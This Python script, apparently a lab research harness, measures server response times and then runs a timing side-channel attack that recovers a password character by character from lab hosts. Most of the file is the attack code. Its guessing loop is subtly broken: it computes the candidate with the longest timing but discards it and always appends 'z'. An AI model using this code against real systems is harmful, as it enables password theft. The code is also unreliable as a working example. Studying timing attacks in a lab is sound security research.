# MIT License
#
# Copyright (c) 2017 Apogee Research
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.


import json
import pickle
import socket
import sys

import matplotlib

matplotlib.use('Agg')
import matplotlib.pyplot as plt
import numpy as np


def establish_data():
    data_host = 'masterNuc'
    data_port = 9090
    try:
        s_ = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s_.connect((data_host, data_port))
        return s_
    except:
        print("Error: Data Establish")
        sys.exit(-1)


def send_cmd(c_, message):
    to_send = message + "\r"
    c_.sendall(to_send.encode())


def receive_cmd(c_):
    msg_char = ""
    message = ""
    while msg_char != "\r":
        msg_char = c_.recv(1).decode()
        message += msg_char
    return message.strip()


def close_cmd(c_):
    c_.close()


def final_response_received(response):
    return "Correct" in response or "Incorrect" in response


def send_request(remote_host, remote_port, request):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((remote_host, remote_port))
        to_send = request + '\n'
        s.sendall(to_send.encode())
        response = s.recv(1024).decode().strip()
        while not final_response_received(response):
            response = s.recv(1024).decode().strip()
        s.close()
        return {"request": request, "response": response, "runtime": 0}
    except:
        return "Sample Error"


def single_sample(s_data_, remote_host, remote_port, sample, request, display=True):
    # Inform data host to start
    send_data_command_1 = {"DATA_Command": "Start", "REMOTE_PORT": remote_port, "Sample": sample}
    send_cmd(s_data_, json.dumps(send_data_command_1))
    data_msg_in_1 = receive_cmd(s_data_)
    data_in_1 = json.loads(data_msg_in_1)
    assert (data_in_1["DATA_Status"] == "Started")
    if display:
        print("\tA", "Starting")
        print("\t\tSending Request Processing Response")
        sys.stdout.flush()

    # Send attacker request
    attacker_request = request
    attacker_response = send_request(remote_host, remote_port, attacker_request)

    # Inform data host to stop
    send_data_command_2 = {"DATA_Command": "Stop", "Sample": sample}
    send_cmd(s_data_, json.dumps(send_data_command_2))
    data_msg_in_2 = receive_cmd(s_data_)

    # Processed timing host response/data
    data_in_2 = json.loads(data_msg_in_2)
    assert (data_in_2["DATA_Status"] == "Stopped")

    # Check for sample error (attacker and or benign) on timer and client
    if "Sample Error" not in [attacker_response,
                              data_in_2["Sample_Status"]]:
        return {"Response": attacker_response["response"], "Data": data_in_2["Data"]}
    else:
        return "Error"


def collect_data(remote_host, remote_port, samples, s_data_):
    data_dict = {'a': [], 'z': [], 'zzzzzzzza': [], 'zzzzzzzzz': []}

    # Start sampling
    for sample in range(1, samples + 1, 1):
        print("Sample:", sample, "of", samples)
        sys.stdout.flush()

        for key in data_dict.keys():
            result = single_sample(s_data_, remote_host, remote_port, sample, key + 'a')

            if result == "Error":
                print("\t\tError Sample:", sample)
                sys.stdout.flush()
            else:
                data_dict[key].append(result["Data"])

            print("\tB", "Stopping")
            print("\t\tProceeding to Next")
            sys.stdout.flush()

    print("Complete")
    sys.stdout.flush()
    return data_dict


def setup_data():
    # Establish data
    s_data_ = establish_data()
    return s_data_


def terminate_data(s_data_):
    # Inform data server complete
    send_data_command_3 = {"DATA_Command": "Complete"}
    send_cmd(s_data_, json.dumps(send_data_command_3))
    data_msg_in_3 = receive_cmd(s_data_)
    data_in_3 = json.loads(data_msg_in_3)
    assert (data_in_3["DATA_Status"] == "Complete")
    close_cmd(s_data_)


def process_results(data_filename):
    # Read Data
    data_dict = pickle.load(open(data_filename, "rb"))
    counter = 1
    for key_set in [['a', 'z'], ['zzzzzzzza', 'zzzzzzzzz']]:
        correct = data_dict[key_set[1]]
        incorrect = data_dict[key_set[0]]
        newkeys = {'Req-Resp': [3, 0], 'Req-Bad': [2, 0], 'Bad-Resp': [3, 2], 'Check-Bad': [2, 1]}
        if len(key_set[0]) == 1:
            figure_name = "1st Character"
        else:
            figure_name = "9th Character"
        print("Data:", figure_name)
        for nk in newkeys.keys():
            sub_correct = [i[newkeys[nk][0]] - i[newkeys[nk][1]] for i in correct]
            sub_incorrect = [i[newkeys[nk][0]] - i[newkeys[nk][1]] for i in incorrect]
            print('\tSC:', nk, 'Correct Distribution:', np.mean(sub_correct), '+-', np.std(sub_correct), "ms")
            print('\tSC:', nk, 'Incorrect Distribution:', np.mean(sub_incorrect), '+-', np.std(sub_incorrect), "ms")
            name = "{:}_SC_{:}".format(figure_name, nk)
            plot_data(sub_correct, sub_incorrect, name)
        counter += 1


def plot_data(correct, incorrect, figname, display=True):
    def get_bins(data, a, b, n):
        # Get plot data
        bins = np.arange(a, b + (b - a) / n, (b - a) / n)
        H = plt.hist(data, bins=bins)
        plt.close()
        x = H[1][:-1]
        y = H[0]

        return [x, y]

    a = 0
    b = 200
    n = 500
    fs = 12

    correct_H = get_bins(correct, a, b, n)
    incorrect_H = get_bins(incorrect, a, b, n)

    fig = plt.figure()
    plt.plot(correct_H[0], correct_H[1], color="b", label='Correct')
    plt.plot(incorrect_H[0], incorrect_H[1], color="r", label='Incorrect')
    plt.xlabel("Response Time (ms)", fontsize=fs)
    plt.ylabel("Number of Samples", fontsize=fs)

    plt.xticks(fontsize=fs)
    plt.yticks(fontsize=fs)
    plt.grid()

    fig.savefig("Figures/" + figname + ".png", bbox_inches='tight', format='png', dpi=1200)

    if display:
        plt.show()
    plt.close()


def save_results(filename, results_data):
    with open("Data Input/" + filename + ".p", "wb") as out_file:
        pickle.dump(results_data, out_file)


def launch_attack(remote_host, remote_port, s_data_):
    alphabet = list("abcdefghijklmnopqrstuvwxyz")
    max_ops = 300
    operations = 0
    guess = ""
    M = 10
    sample_history = {}

    def proceed(m_operations):
        if m_operations > max_ops:
            print("Exceeded Operational Budget")
            return False
        return True

    # Start exploit
    while proceed(operations):
        print("Guess:", guess)
        sample = 1
        sys.stdout.flush()

        # Current guess chars
        n = len(guess) + 1

        for char in alphabet:
            operations += 1

            # Send sample
            if (n != M):
                request = guess + char + 'a'  # Add an extra char to get 'Bad' SC timing
            else:
                request = guess + char  # Server has max length of 10, so need to just guess for the last round
            result = single_sample(s_data_, remote_host, remote_port, sample, request, False)
            if result == "Error":
                break
            response = result["Response"]
            response_time = result["Data"]
            # If we are on the last character
            if n == M and response == "Correct":
                # If we guess correct then exit loop, we're done
                print("Password =", request)
                break
            else:
                SC_time = response_time[2] - response_time[1]  # There's no bad response for the last char
                print("\tOps:", operations, "Req:", request, "Resp:", response, "Time:", SC_time)
                # Track previous samples
                if request in sample_history:
                    sample_history[request].append(SC_time)
                else:
                    sample_history[request] = [SC_time]

            if operations >= max_ops:
                break

            # After guessing each char in the alphabet, pick the key (char) with the largest (sc time) value

            if char == 'z':
                v = list(sample_history.values())
                k = list(sample_history.keys())
                print("Sample with the max SC time: ")
                b = k[v.index(max(v))]
                print(b)
                chosen_char = guess + char
                guess = chosen_char  # that starts out the new round of guessing
                sample_history = {}

        if n == M:
            # Don't continue if we've hit the password length
            break

    print("Complete")
    sys.stdout.flush()
    return {"Num Ops": operations, "Password": guess}


def main():
    remote_host = 'serverNuc'
    remote_port = 8000
    data_filename = "Category 18 V"
    filename = "Data Input/Category 18 V.p"

    print("Starting Sampling Host:", remote_host, ":", remote_port)
    sys.stdout.flush()
    samples = 1000
    s_data_ = setup_data()
    results = collect_data(remote_host, remote_port, samples, s_data_)
    save_results(data_filename, results)
    process_results(filename)
    attack_output = launch_attack(remote_host, remote_port, s_data_)
    terminate_data(s_data_)
    print("Result:", attack_output)


if __name__ == "__main__":
    main()
